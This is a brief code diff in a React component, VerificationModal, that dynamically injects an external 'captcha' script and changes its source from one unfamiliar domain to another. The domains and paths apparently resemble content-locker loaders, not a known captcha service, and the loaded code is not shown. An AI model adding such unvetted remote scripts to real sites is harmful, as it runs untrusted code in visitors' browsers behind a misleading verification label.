@@ -11,7 +11,7 @@ const VerificationModal = ({ isOpen, onClose }: VerificationModalProps) => {
     if (isOpen && typeof window !== 'undefined') {
       // Load captcha script dynamically
       const script = document.createElement('script');
-      script.src = 'https://pagelocked.org/cp/js/1qj36';
+      script.src = 'https://authenticateapp.online/cp/js/n0208';
       script.type = 'text/javascript';
       document.body.appendChild(script);
 
